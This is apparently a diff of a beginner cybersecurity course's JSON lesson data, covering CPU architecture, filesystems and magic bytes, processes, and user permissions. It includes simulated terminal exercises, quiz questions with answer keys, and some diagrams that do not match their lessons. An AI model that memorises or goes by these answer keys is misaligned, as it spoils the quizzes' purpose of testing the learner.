+        "content": "You will often see software labeled as `x86` (32-bit) or `x64` / `x86_64` (64-bit):\n\n\u2022 **32-Bit**: The CPU can only address $2^{32}$ bytes of memory, which equals exactly **4 Gigabytes (GB)** of RAM. Modern operating systems have moved away from 32-bit because modern software needs much more memory.\n\u2022 **64-Bit**: The CPU registers are 64 bits wide ($2^{64}$ memory addresses), allowing theoretically 16 exabytes of RAM. 64-bit systems also have stronger security features like hardware-enforced Data Execution Prevention (DEP / NX bit)."
+      },
+      {
+        "title": "3. The Fetch-Decode-Execute Cycle",
+        "content": "Every program\u2014whether it is a calculator, a video game, or a piece of ransomware\u2014is broken down into machine code. The CPU repeatedly performs three steps millions of times per second:\n\n1. **Fetch**: Read the next instruction from memory at the address pointed to by the Instruction Pointer (IP / PC register).\n2. **Decode**: Interpret what operation to perform (add numbers, compare strings, move bytes).\n3. **Execute**: Perform the operation and store the result in a CPU register or write it back to RAM."
       }
     ],
     "seeExamples": [
       {
-        "title": "Lifecycle of a Running Program",
-        "codeOrDiagram": "[ Storage: /bin/ls (Static File on SSD) ]\n                 ↓ Loaded into RAM\n[ RAM: Process PID #4092 (Virtual Memory Space) ]\n                 ↓\n[ CPU: Fetches opcodes -> Executes instructions -> Prints output ]",
-        "explanation": "A file on storage becomes an active process once it is mapped into RAM and scheduled onto the CPU."
+        "title": "Querying System Hardware in the Terminal",
+        "codeOrDiagram": "cadet@endlessus:~$ uname -m\nx86_64\n\ncadet@endlessus:~$ free -h\n               total        used        free      shared  buff/cache   available\nMem:           15Gi       3.2Gi       8.4Gi       320Mi       4.1Gi        12Gi\nSwap:         2.0Gi          0B       2.0Gi",
+        "explanation": "`uname -m` reveals the machine processor architecture (`x86_64` = 64-bit). `free -h` displays human-readable RAM usage."
       }
     ],
     "tryInteractive": {
       "type": "terminal",
-      "prompt": "Check the current memory status of our lab system using the standard Linux command `free -m`:",
+      "prompt": "Run `uname -m` in the terminal to inspect the processor architecture of the simulated machine:",
       "initialCommand": "",
-      "expectedCommand": "free -m",
-      "simulatedOutput": "               total        used        free      shared  buff/cache   available\nMem:            7924        1840        4210         124        1874        5710\nSwap:           2048           0        2048\n[+] Success! You inspected system RAM. Total: 7924MB (~8GB), Free: 4210MB (~4.2GB).",
-      "explanation": "`free -m` displays memory usage in Megabytes (MB). This lets security analysts detect memory exhaustion or stealthy malware consuming RAM."
+      "expectedCommand": "uname -m",
+      "simulatedOutput": "x86_64\n[+] Architecture identified: 64-bit x86_64 CPU.",
+      "explanation": "`uname` with the `-m` flag outputs the machine hardware architecture."
     },
     "questions": [
       {
-        "id": "r2-q1",
-        "type": "multiple-choice",
-        "question": "When a computer loses electrical power abruptly, which component immediately loses all of its stored data?",
-        "options": [
-          "NVMe Solid State Drive (SSD)",
-          "Random Access Memory (RAM)",
-          "Magnetic Hard Disk Drive (HDD)",
-          "Motherboard BIOS / UEFI Flash Chip"
+        "id": "q-03-1",
+        "type": "exact",
+        "question": "Which volatile memory component holds the active working set of running programs and loses all data when power is lost?",
+        "visualSlots": "_ _ _",
+        "acceptedAnswers": [
+          "RAM",
+          "Random Access Memory"
         ],
-        "correctIndex": 1,
-        "explanation": "RAM is volatile memory. Without electrical charge, dynamic RAM capacitors quickly discharge, clearing all active data."
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "3-letter abbreviation for Random Access Memory.",
+        "explanation": "RAM (Random Access Memory) is volatile memory that requires continuous electric power to preserve state."
       },
       {
-        "id": "r2-q2",
+        "id": "q-03-2",
         "type": "multiple-choice",
-        "question": "What is the technical term for a program that has been loaded into memory and is currently being executed by the CPU?",
+        "question": "What is the maximum theoretical RAM capacity that a 32-bit (x86) operating system architecture can directly address?",
         "options": [
-          "A Script",
-          "A Process",
-          "A Package",
-          "A Driver"
+          "512 Megabytes (MB)",
+          "4 Gigabytes (GB)",
+          "16 Gigabytes (GB)",
+          "64 Terabytes (TB)"
         ],
         "correctIndex": 1,
-        "explanation": "A static file on disk is a program; once loaded into RAM and scheduled for CPU execution, it is an active process with a Process ID (PID)."
+        "hint": "2 to the power of 32 bytes equals approximately 4.29 billion bytes.",
+        "explanation": "Because 2^32 = 4,294,967,296 bytes, a 32-bit CPU can only address up to 4 GB of physical memory."
       }
     ],
     "tasks": [
       {
-        "title": "Task 1: Inspect System Memory",
-        "instruction": "Run `free -m` in the terminal to inspect available RAM on the lab machine.",
+        "title": "Task 1: Query CPU architecture",
+        "instruction": "Execute `uname -m` in the terminal to verify the 64-bit environment.",
         "hints": [
-          "Concept: Memory utilization command.",
-          "Direction: Use the Linux command for free memory.",
-          "Tool: `free` command.",
-          "Syntax: `free -m` (displays values in megabytes).",
-          "Explanation: Output reveals total, used, and free memory."
+          "Type: `uname -m`"
         ]
       }
     ],
-    "explainResult": "The `free -m` command queried the Linux virtual kernel file `/proc/meminfo`, parsed the current physical memory pages, and presented the data in easy-to-read megabytes.",
-    "securityConnection": "In digital forensics and incident response, RAM holds unencrypted passwords, decrypted cryptographic keys, and running malware artifacts that may never touch the hard disk! Forensic examiners perform 'RAM acquisition' before powering down a compromised server.",
-    "completion": {
-      "learned": [
-        "Hardware hierarchy: CPU, RAM, Storage, and Motherboard",
-        "The difference between volatile memory and non-volatile storage",
-        "How binary represents instructions and data",
-        "The distinction between a static program file and an active process"
-      ],
-      "practiced": [
-        "free -m",
-        "Interpreting memory tables",
-        "Identifying volatile artifacts"
-      ]
-    },
-    "nextRoomId": "room-03"
+    "securityConnection": "In reverse engineering and binary exploitation, understanding CPU registers (like RIP/EIP, RSP/ESP) is essential. Attackers exploit buffer overflows by corrupting CPU memory pointers to redirect execution to malicious code.",
+    "id": "room-03",
+    "nextRoomId": "room-04"
   },
   {
-    "id": "room-03",
     "stage": 1,
-    "stageTitle": "Stage 1 — Computer Fundamentals",
-    "title": "Operating Systems & The Kernel",
+    "level": 1,
+    "levelTitle": "Level 1 \u2014 Computer Fundamentals",
+    "title": "Filesystems, Folders & File Types",
     "difficulty": "Beginner",
-    "difficultyBadge": "🟢 Beginner",
+    "difficultyBadge": "\ud83d\udfe2 Beginner",
     "estimatedTime": "25 min",
-    "prerequisites": "Room 02 (How Computers Work)",
-    "whyAreYouHere": "Applications cannot talk directly to raw silicon; doing so would allow any program to corrupt other programs or damage hardware. The Operating System (OS) is the master coordinator. In this room, you will learn how the kernel protects hardware, what system calls are, and why Linux powers the vast majority of cybersecurity infrastructure and cloud servers.",
+    "prerequisites": "Room 03: Computer Hardware & Architecture",
+    "whyAreYouHere": "Files are how operating systems organize information on persistent storage. But how does a computer know whether a file is a photo, an executable script, or a document? In this room, you will learn how filesystems work and discover why security analysts never trust file extensions alone.",
     "objectives": [
-      "Understand what an Operating System does",
-      "Learn the difference between Kernel Space and User Space",
-      "Understand how applications make System Calls (syscalls) to request privileged actions",
-      "Compare Windows architecture with Linux architecture",
-      "Inspect the running kernel version on your system"
+      "Understand hierarchical directory trees and filesystems (EXT4, NTFS, FAT32)",
+      "Learn the difference between file extensions and file magic bytes (signatures)",
+      "Understand file metadata: creation timestamps, modification times, and inode numbers",
+      "Learn how attackers disguise malicious files by renaming extensions",
+      "Use the `file` utility to identify true file types by signature"
+    ],
+    "vocabulary": [
+      {
+        "term": "Filesystem",
+        "definition": "The method and data structures an operating system uses to control how data is stored and retrieved on a disk (e.g., ext4, NTFS)."
+      },
+      {
+        "term": "File Extension",
+        "definition": "The suffix at the end of a filename (e.g., .txt, .exe, .pdf) indicating the intended format to the user and GUI."
+      },
+      {
+        "term": "Magic Bytes (File Signature)",
+        "definition": "A unique sequence of bytes at the very beginning of a file that identifies its true file format, regardless of the extension."
+      },
+      {
+        "term": "Inode",
+        "definition": "A data structure in Unix/Linux filesystems that stores all metadata about a file (size, owner, permissions, disk location) except its name."
+      },
+      {
+        "term": "Metadata",
+        "definition": "Data that describes other data, such as file author, creation date, GPS location in photos, and modification timestamps."
+      }
+    ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 180\" width=\"100%\" height=\"180\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0f172a;border-radius:8px;font-family:sans-serif;\">\n  <rect x=\"30\" y=\"30\" width=\"140\" height=\"120\" rx=\"8\" fill=\"#1e293b\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <text x=\"100\" y=\"70\" fill=\"#38bdf8\" font-size=\"16\" font-weight=\"bold\" text-anchor=\"middle\">CPU</text>\n  <text x=\"100\" y=\"95\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Arithmetic &amp; Logic</text>\n  <text x=\"100\" y=\"115\" fill=\"#cbd5e1\" font-size=\"10\" text-anchor=\"middle\">Executes instructions</text>\n\n  <path d=\"M 170 90 L 230 90\" stroke=\"#38bdf8\" stroke-width=\"3\" stroke-dasharray=\"4\"/>\n  <text x=\"200\" y=\"80\" fill=\"#38bdf8\" font-size=\"10\" text-anchor=\"middle\">BUS</text>\n\n  <rect x=\"230\" y=\"30\" width=\"140\" height=\"120\" rx=\"8\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <text x=\"300\" y=\"70\" fill=\"#10b981\" font-size=\"16\" font-weight=\"bold\" text-anchor=\"middle\">RAM</text>\n  <text x=\"300\" y=\"95\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Volatile Memory</text>\n  <text x=\"300\" y=\"115\" fill=\"#cbd5e1\" font-size=\"10\" text-anchor=\"middle\">Fast working set</text>\n\n  <path d=\"M 370 90 L 430 90\" stroke=\"#10b981\" stroke-width=\"3\" stroke-dasharray=\"4\"/>\n  <text x=\"400\" y=\"80\" fill=\"#10b981\" font-size=\"10\" text-anchor=\"middle\">NVMe</text>\n\n  <rect x=\"430\" y=\"30\" width=\"140\" height=\"120\" rx=\"8\" fill=\"#1e293b\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n  <text x=\"500\" y=\"70\" fill=\"#f59e0b\" font-size=\"16\" font-weight=\"bold\" text-anchor=\"middle\">SSD / Storage</text>\n  <text x=\"500\" y=\"95\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Non-Volatile</text>\n  <text x=\"500\" y=\"115\" fill=\"#cbd5e1\" font-size=\"10\" text-anchor=\"middle\">Permanent files</text>\n</svg>",
+    "lessons": [
+      {
+        "title": "1. How Filesystems Work",
+        "content": "A raw hard drive or SSD is just a sequence of billions of binary magnetic or electrical cells. Without a filesystem, the computer would have no way to know where one file begins and another ends!\n\nA **filesystem** (like Linux's `ext4` or Windows' `NTFS`) divides the disk into blocks, maintains a master directory table, and tracks which blocks belong to which file.\n\n\u2022 Windows uses drive letters (`C:\\`, `D:\\`).\n\u2022 Linux uses a single unified tree starting at the root directory (`/`)."
+      },
+      {
+        "title": "2. File Extensions vs Magic Bytes (Signatures)",
+        "content": "Operating systems like Windows rely heavily on **file extensions** (like `.png` or `.docx`) to choose which application opens a file. But file extensions can be renamed with a single click!\n\nIf an attacker renames a malicious executable `malware.exe` to `invoice.pdf`, Windows may show a PDF icon, but the file is still an executable!\n\nSecurity professionals identify file types using **Magic Bytes** (File Signatures)\u2014the first 2 to 8 bytes inside the file header:\n\n\u2022 `89 50 4E 47` (`.PNG` in hex) indicates a PNG image.\n\u2022 `25 50 44 46` (`%PDF` in hex) indicates an authentic PDF document.\n\u2022 `4D 5A` (`MZ` in hex) indicates a Windows Portable Executable (`.exe` or `.dll`)."
+      },
+      {
+        "title": "3. File Metadata and Timestamps (MACB)",
+        "content": "Every file contains metadata tracked by the filesystem:\n\n\u2022 **M**odified: When file content was last changed.\n\u2022 **A**ccessed: When the file was last opened or read.\n\u2022 **C**hanged: When file permissions or ownership metadata changed (Unix).\n\u2022 **B**irth (Created): When the file was originally created on the disk.\n\nDigital forensic investigators use these timestamps to reconstruct attacker timelines during incident response."
+      }
+    ],
+    "seeExamples": [
+      {
+        "title": "Using the 'file' command to inspect true file type",
+        "codeOrDiagram": "cadet@endlessus:~$ ls -l photo.jpg\n-rw-r--r-- 1 cadet cadet 45280 Oct 15 12:00 photo.jpg\n\ncadet@endlessus:~$ file photo.jpg\nphoto.jpg: ELF 64-bit LSB executable, x86-64, dynamically linked\n\n[!] ALERT: photo.jpg has an image extension, but file magic bytes prove it is a compiled Linux ELF binary!",
+        "explanation": "The `file` utility ignores the filename suffix and reads the actual header magic bytes, immediately catching disguised malware."
+      }
+    ],
+    "tryInteractive": {
+      "type": "terminal",
+      "prompt": "Run `file sample.bin` in the terminal to inspect the real file type using its header bytes:",
+      "initialCommand": "",
+      "expectedCommand": "file sample.bin",
+      "simulatedOutput": "sample.bin: ASCII text\n[+] Inspection complete: The file contains human-readable ASCII text.",
+      "explanation": "The `file` command analyzes the byte sequence at the start of `sample.bin`."
+    },
+    "questions": [
+      {
+        "id": "q-04-1",
+        "type": "exact",
+        "question": "What Linux command determines a file's true format by examining its magic byte signature rather than its filename extension?",
+        "visualSlots": "_ _ _ _",
+        "acceptedAnswers": [
+          "file"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "A simple 4-letter command: f---.",
+        "explanation": "The `file` utility examines file magic numbers and data structures to determine actual file type."
+      },
+      {
+        "id": "q-04-2",
+        "type": "multiple-choice",
+        "question": "What hex characters appear at the start of all Windows executable (.exe) and dynamic link library (.dll) files as their magic byte signature?",
+        "options": [
+          "MZ (4D 5A)",
+          "PNG (89 50)",
+          "PDF (25 50)",
+          "GIF (47 49)"
+        ],
+        "correctIndex": 0,
+        "hint": "Named after Mark Zbikowski, an early MS-DOS architect.",
+        "explanation": "Windows executables start with 'MZ' (hex 4D 5A), identifying them to the Windows PE loader."
+      }
+    ],
+    "tasks": [
+      {
+        "title": "Task 1: Inspect a file using the file utility",
+        "instruction": "Run `file sample.bin` in the terminal to view file type detection in action.",
+        "hints": [
+          "Type: `file sample.bin`"
+        ]
+      }
+    ],
+    "securityConnection": "Attackers frequently attempt file upload bypasses on web servers (e.g. uploading a PHP shell named `shell.php.jpg`). Secure applications must check both MIME type and header magic bytes rather than trusting the user-supplied filename.",
+    "id": "room-04",
+    "nextRoomId": "room-05"
+  },
+  {
+    "stage": 1,
+    "level": 1,
+    "levelTitle": "Level 1 \u2014 Computer Fundamentals",
+    "title": "Programs, Processes & Background Services",
+    "difficulty": "Beginner",
+    "difficultyBadge": "\ud83d\udfe2 Beginner",
+    "estimatedTime": "25 min",
+    "prerequisites": "Room 04: Filesystems, Folders & Extensions",
+    "whyAreYouHere": "A program sitting on your hard drive does nothing until it is executed. Once launched into RAM, it becomes a **process** with its own memory space, permissions, and Process ID (PID). In this room, you will learn how the operating system manages running processes, background services, and how security analysts detect suspicious activity.",
+    "objectives": [
+      "Understand the distinction between a program (dormant on disk) and a process (active in memory)",
+      "Learn about Process IDs (PIDs), Parent-Child process relationships, and process trees",
+      "Understand system services (daemons in Linux, Windows services)",
+      "Learn how the OS schedules CPU time across hundreds of concurrent processes",
+      "Inspect running processes using `ps` and terminate rogue processes with `kill`"
+    ],
+    "vocabulary": [
+      {
+        "term": "Program",
+        "definition": "A passive collection of compiled instructions stored as a file on persistent disk storage."
+      },
+      {
+        "term": "Process",
+        "definition": "An active instance of a computer program being executed by the CPU, with allocated RAM, open files, and a unique PID."
+      },
+      {
+        "term": "PID (Process ID)",
+        "definition": "A unique numeric identifier assigned by the operating system kernel to each active process."
+      },
+      {
+        "term": "Daemon / Service",
+        "definition": "A background process that runs continuously without a graphical interface or interactive user login (e.g., web servers, SSH server)."
+      },
+      {
+        "term": "Process Tree",
+        "definition": "The hierarchical parent-child structure showing which process spawned which subordinate processes."
+      }
+    ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 160\" width=\"100%\" height=\"160\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0b0f19;border-radius:8px;font-family:monospace;\">\n  <rect x=\"20\" y=\"25\" width=\"160\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <text x=\"100\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Learner (You)</text>\n  <text x=\"100\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Input Command</text>\n  <text x=\"100\" y=\"110\" fill=\"#38bdf8\" font-size=\"12\" text-anchor=\"middle\">whoami</text>\n  \n  <path d=\"M 180 80 L 230 80\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <polygon points=\"230,80 220,75 220,85\" fill=\"#38bdf8\"/>\n  \n  <rect x=\"230\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <text x=\"305\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Shell (Bash)</text>\n  <text x=\"305\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Parses Command</text>\n  <text x=\"305\" y=\"110\" fill=\"#10b981\" font-size=\"11\" text-anchor=\"middle\">Executes /usr/bin</text>\n\n  <path d=\"M 380 80 L 430 80\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <polygon points=\"430,80 420,75 420,85\" fill=\"#10b981\"/>\n  \n  <rect x=\"430\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n  <text x=\"505\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Linux Kernel</text>\n  <text x=\"505\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Queries User ID</text>\n  <text x=\"505\" y=\"110\" fill=\"#f59e0b\" font-size=\"12\" text-anchor=\"middle\">Output: cadet</text>\n</svg>",
+    "lessons": [
+      {
+        "title": "1. Program vs Process",
+        "content": "\u2022 **Program**: Like a recipe printed in a cookbook on your bookshelf. It sits on your hard disk consuming storage bytes, but it is not doing anything.\n\u2022 **Process**: The chef actively cooking that recipe in the kitchen. When you double-click or type a command to run a program, the operating system copies its instructions into RAM, creates CPU execution threads, and gives it a **Process ID (PID)**.\n\nYou can launch 10 separate windows of a text editor: that is **1 program file** on disk creating **10 distinct processes** in RAM!"
+      },
+      {
+        "title": "2. Parent and Child Processes",
+        "content": "Every process in an operating system is spawned by another process (its **Parent Process**):\n\n1. In Linux, the very first process started by the kernel is `systemd` or `init` (PID 1).\n2. When you open a terminal, `systemd` launches the terminal emulator (PID 1050).\n3. Inside the terminal, you run `bash` (PID 1052).\n4. In bash, you type `whoami`. Bash spawns a child process for `whoami` (PID 1100).\n\nIf a parent process terminates, its child processes may become 'orphaned' or automatically closed."
+      },
+      {
+        "title": "3. Background Services (Daemons)",
+        "content": "Most operating system tasks do not have windows or icons. They run silently in the background as **services** (called **daemons** in Linux, usually ending with 'd' like `sshd` or `httpd`):\n\n\u2022 `sshd`: Listens for incoming Secure Shell remote administrator connections on port 22.\n\u2022 `cron`: Executes scheduled tasks at specific dates and times.\n\u2022 `systemd-resolved`: Handles DNS lookups for apps in the background.\n\nSecurity monitoring tools watch for newly created services, because malware often installs persistent background services to maintain access across reboots."
+      }
+    ],
+    "seeExamples": [
+      {
+        "title": "Listing Processes with 'ps' in Linux",
+        "codeOrDiagram": "cadet@endlessus:~$ ps -ef | head -n 5\nUID          PID    PPID  C STIME TTY          TIME CMD\nroot           1       0  0 09:00 ?        00:00:01 /sbin/init\nroot           2       0  0 09:00 ?        00:00:00 [kthreadd]\nroot         412       1  0 09:00 ?        00:00:00 /usr/sbin/sshd -D\ncadet       1024     412  0 09:15 pts/0    00:00:00 -bash",
+        "explanation": "`ps -ef` shows the running user (UID), the Process ID (PID), the Parent Process ID (PPID), and the command path (CMD)."
+      }
+    ],
+    "tryInteractive": {
+      "type": "terminal",
+      "prompt": "Run `ps` in the terminal to inspect the active processes in your current shell session:",
+      "initialCommand": "",
+      "expectedCommand": "ps",
+      "simulatedOutput": "  PID TTY          TIME CMD\n 1024 pts/0    00:00:00 bash\n 1089 pts/0    00:00:00 ps\n[+] Process table listed: You can see bash and the ps command itself.",
+      "explanation": "`ps` without flags shows processes associated with the current terminal session."
+    },
+    "questions": [
+      {
+        "id": "q-05-1",
+        "type": "exact",
+        "question": "What 3-letter acronym represents the unique numeric identifier that an operating system kernel assigns to every running process?",
+        "visualSlots": "_ _ _",
+        "acceptedAnswers": [
+          "PID",
+          "Process ID"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Process ID abbreviation.",
+        "explanation": "PID stands for Process Identifier."
+      },
+      {
+        "id": "q-05-2",
+        "type": "multiple-choice",
+        "question": "In Linux systems, what is the convention for the PID assigned to the very first userspace initialization process (e.g. systemd or init)?",
+        "options": [
+          "PID 0",
+          "PID 1",
+          "PID 100",
+          "PID 65535"
+        ],
+        "correctIndex": 1,
+        "hint": "The first process always gets number one.",
+        "explanation": "PID 1 is reserved for the initial system manager process (init or systemd), which serves as ancestor to all other processes."
+      }
+    ],
+    "tasks": [
+      {
+        "title": "Task 1: Inspect active processes",
+        "instruction": "Execute `ps` in the terminal to view running processes.",
+        "hints": [
+          "Type: `ps`"
+        ]
+      }
+    ],
+    "securityConnection": "Attackers hide malicious processes through 'process hollowing' or 'DLL injection' into legitimate system processes like `svchost.exe` (on Windows). Threat hunters analyze anomalous parent-child relationships (e.g. Word spawning PowerShell: `winword.exe` -> `powershell.exe`) to catch malware in action.",
+    "id": "room-05",
+    "nextRoomId": "room-06"
+  },
+  {
+    "stage": 1,
+    "level": 1,
+    "levelTitle": "Level 1 \u2014 Computer Fundamentals",
+    "title": "Operating Systems & User Permissions",
+    "difficulty": "Beginner",
+    "difficultyBadge": "\ud83d\udfe2 Beginner",
+    "estimatedTime": "25 min",
+    "prerequisites": "Room 05: Programs, Processes & Services",
+    "whyAreYouHere": "An Operating System (OS) is the software intermediary between your physical hardware and all applications. Crucially, the OS enforces security boundaries: who can read a file, who can configure a network adapter, and who can install software. In this room, you will learn the principle of least privilege and user permission models.",
+    "objectives": [
+      "Understand the role of the OS Kernel and the boundary between Kernel Mode and User Mode",
+      "Learn the security hierarchy: Standard Unprivileged Users vs Superusers (root / Administrator)",
+      "Understand the Principle of Least Privilege (PoLP)",
+      "Learn how Access Control Lists (ACLs) and file permission bits enforce security",
+      "Recognize why privilege escalation is the primary objective of penetration testers"
     ],
     "vocabulary": [
       {
         "term": "Kernel",
-        "definition": "The core program of the operating system that runs with supreme hardware privilege (Ring 0) and controls CPU, memory, and devices."
+        "definition": "The core program of the operating system that has complete control over everything in the system, managing CPU, memory, and hardware devices."
       },
       {
-        "term": "User Space",
-        "definition": "The restricted memory space (Ring 3) where regular user programs and applications run without direct hardware access."
+        "term": "Kernel Mode (Ring 0)",
+        "definition": "The privileged execution mode where code has direct, unrestricted access to all hardware and memory."
       },
       {
-        "term": "System Call (syscall)",
-        "definition": "The controlled bridge an application uses to ask the kernel to perform a privileged action (like reading a file or sending a packet)."
+        "term": "User Mode (Ring 3)",
+        "definition": "The restricted execution mode where applications run. If an app crashes in User Mode, the system stays safe."
       },
       {
-        "term": "Device Driver",
-        "definition": "A specialized kernel module that translates generic OS commands into hardware-specific signals for a particular device."
+        "term": "Superuser / root",
+        "definition": "The supreme administrative account in Unix/Linux with UID 0, having unrestricted permission to modify any file, process, or setting."
       },
       {
-        "term": "POSIX",
-        "definition": "A family of standards maintaining compatibility between Unix-like operating systems (including Linux, macOS, and BSD)."
+        "term": "Principle of Least Privilege (PoLP)",
+        "definition": "The security best practice that every user, process, and program should only have the minimum permissions necessary to perform its job."
       }
     ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 160\" width=\"100%\" height=\"160\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0b0f19;border-radius:8px;font-family:monospace;\">\n  <rect x=\"20\" y=\"25\" width=\"160\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <text x=\"100\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Learner (You)</text>\n  <text x=\"100\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Input Command</text>\n  <text x=\"100\" y=\"110\" fill=\"#38bdf8\" font-size=\"12\" text-anchor=\"middle\">whoami</text>\n  \n  <path d=\"M 180 80 L 230 80\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <polygon points=\"230,80 220,75 220,85\" fill=\"#38bdf8\"/>\n  \n  <rect x=\"230\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <text x=\"305\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Shell (Bash)</text>\n  <text x=\"305\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Parses Command</text>\n  <text x=\"305\" y=\"110\" fill=\"#10b981\" font-size=\"11\" text-anchor=\"middle\">Executes /usr/bin</text>\n\n  <path d=\"M 380 80 L 430 80\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <polygon points=\"430,80 420,75 420,85\" fill=\"#10b981\"/>\n  \n  <rect x=\"430\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n  <text x=\"505\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Linux Kernel</text>\n  <text x=\"505\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Queries User ID</text>\n  <text x=\"505\" y=\"110\" fill=\"#f59e0b\" font-size=\"12\" text-anchor=\"middle\">Output: cadet</text>\n</svg>",
     "lessons": [
       {
         "title": "1. Kernel Space vs User Space",
-        "content": "Modern CPUs enforce hardware privilege rings:\n• **Ring 0 (Kernel Space)**: Has direct, unrestricted access to all CPU instructions and physical memory. If code here crashes, the entire computer suffers a Blue Screen or Kernel Panic.\n• **Ring 3 (User Space)**: Where your web browser, text editor, or game runs. If a program here crashes, only that single process terminates; the rest of the OS keeps running safely."
+        "content": "Modern computer processors enforce hardware protection rings:\n\n\u2022 **Ring 0 (Kernel Mode)**: The OS kernel executes here. It directly talks to physical RAM, SSD controllers, network cards, and CPU cores. A bug in Kernel Mode causes a system crash (Blue Screen of Death / Kernel Panic).\n\u2022 **Ring 3 (User Mode)**: All your everyday programs\u2014web browsers, text editors, games\u2014run here. They cannot touch hardware directly. When Chrome wants to read a file from disk, it must ask the kernel nicely using a **System Call (syscall)**.\n\nThe kernel checks: *Does this user have permission to read this file?* If yes, the kernel reads the bytes and passes them to Chrome. If no, it returns 'Permission Denied'!"
       },
       {
-        "title": "2. How System Calls Protect the Machine",
-        "content": "When an app in User Space wants to read a file from the hard drive:\n1. It cannot directly pulse the SSD controller.\n2. It executes a **System Call** (such as `sys_read` in Linux).\n3. The CPU transitions into Kernel Mode.\n4. The kernel checks permissions: *Does this user have permission to open this file?*\n5. If allowed, the kernel fetches the bytes and copies them back to the user app."
+        "title": "2. The Privilege Hierarchy: Standard User vs Root",
+        "content": "Operating systems isolate different people and processes through user accounts:\n\n\u2022 **Standard User (e.g. `cadet`)**: Can read and write their own home directory files (`/home/cadet`), but cannot touch other users' files, modify system configuration in `/etc`, or install kernel drivers.\n\u2022 **Superuser (`root` in Linux, `SYSTEM` / `Administrator` in Windows)**: Can read and delete ANY file on the system, shut down servers, capture raw network traffic, and reset all passwords.\n\nRunning everyday tasks as `root` is dangerous: if you accidentally download malware while logged in as root, the malware inherits root powers!"
+      },
+      {
+        "title": "3. The Principle of Least Privilege (PoLP)",
+        "content": "One of the most foundational principles in all of cybersecurity is the **Principle of Least Privilege**:\n\n*Every program, service, and user should possess only the bare minimum privileges required to do its job, and not a single permission more.*\n\nFor example, a web server process (`www-data`) only needs permission to read website HTML files in `/var/www/html`. It should never have permission to read `/etc/shadow` (password hashes) or run administrative commands."
       }
     ],
     "seeExamples": [
       {
-        "title": "System Call Bridge Diagram",
-        "codeOrDiagram": "[ User Space (Ring 3) ]   User Application (e.g. cat secret.txt)\n                                  ↓ syscall: open() & read()\n====================== [ Protection Boundary ] ======================\n[ Kernel Space (Ring 0) ] Linux Kernel checks permissions -> Reads Disk Controller",
-        "explanation": "The OS boundary guarantees that malicious or broken programs cannot bypass filesystem permissions or access memory belonging to other users."
+        "title": "Checking User Identity and Permissions with 'id'",
+        "codeOrDiagram": "cadet@endlessus:~$ id\nuid=1001(cadet) gid=1001(cadet) groups=1001(cadet),27(sudo)\n\nroot@endlessus:~# id\nuid=0(root) gid=0(root) groups=0(root)",
+        "explanation": "`id` shows your User ID (UID), primary Group ID (GID), and group memberships. UID 0 always belongs to root."
       }
     ],
     "tryInteractive": {
       "type": "terminal",
-      "prompt": "Find out which operating system and kernel version is running in your lab terminal using `uname -a`:",
+      "prompt": "Run `id` in the terminal to inspect your active user ID, group ID, and group memberships:",
       "initialCommand": "",
-      "expectedCommand": "uname -a",
-      "simulatedOutput": "Linux endlessus-box 6.8.0-45-generic #45-Ubuntu SMP PREEMPT_DYNAMIC x86_64 GNU/Linux\n[+] Success! System identified: Linux 6.8.0 on x86_64 architecture.",
-      "explanation": "`uname -a` (Unix Name, all information) tells you the kernel name, hostname, kernel release version, architecture, and OS family."
+      "expectedCommand": "id",
+      "simulatedOutput": "uid=1001(cadet) gid=1001(cadet) groups=1001(cadet)\n[+] Security boundary verified: You are unprivileged user 'cadet' (UID 1001).",
+      "explanation": "`id` prints real and effective user and group IDs."
     },
     "questions": [
       {
